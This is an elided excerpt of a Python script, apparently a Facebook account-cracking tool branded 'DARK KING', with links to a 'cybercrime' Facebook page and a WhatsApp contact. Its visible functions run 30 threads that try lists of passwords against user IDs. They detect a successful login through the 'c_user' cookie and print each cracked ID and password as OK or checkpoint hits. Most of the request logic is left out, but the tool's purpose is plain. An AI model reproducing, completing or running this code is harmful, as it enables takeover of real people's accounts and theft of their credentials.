...
os.system('xdg-open https://www.facebook.com/Darkkingcybercrime71')
...
class Main:
    ...
    def __init__(self):
        ...
        if Alif in ["2","02"]:
            ...
            os.system('xdg-open https://wa.Me/880174028158')
...
def num():
    ...
    with ThreadPool(max_workers=30) as noob:
        ...
        print(' \033[1;97m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] Wait [🧐] for ids 🥰  ')

        print(' \033[1;97m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] Use Flight [✈️] mode for speed up ')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m_𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-X\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[_𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-X-OK💉] {uid} | {ps}")
                ...
                print(f"\x1b[38;5;196m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-X-CP🥴] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-X👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
